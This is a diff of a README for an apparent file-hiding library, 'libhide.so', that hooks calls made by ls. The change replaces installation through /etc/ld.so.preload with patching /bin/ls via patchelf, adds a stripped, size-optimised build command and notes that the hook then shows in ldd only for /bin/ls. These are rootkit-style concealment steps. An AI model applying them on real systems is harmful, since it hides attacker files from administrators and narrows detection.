@@ -7,14 +7,13 @@ as root.
 You may use the Makefile in this directory to build the library for ld.so.preload:
 
 $ make
-cc -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe --std=c17 -march=native -shared -ldl -s -nostartfiles -o libhide.so multi.c
+cc -fPIC -shared -Oz -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 -s -Wa,--no-pad-sections -march=native -pipe -o libhide.so libhide.c -ldl -nostartfiles -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code -s
 
-You can then copy the ld.so.preload or create an /etc/ld.so.preload with the following, or use whatever
-name and location you use for this library file:
+You can then use patchelf to hook calls to ls and hide files:
 
-/lib/x86_64-linux-gnu/libhide.so
+patchelf --add-needed /lib/x86_64-linux-gnu/libhide.so /bin/ls
 
-I should note, this will be noticable using ldd:
+I should note, this will be noticable using ldd only on the /bin/ls binary:
 
 # ldd /bin/ls
 	linux-vdso.so.1 (0x00007fc87a660000)
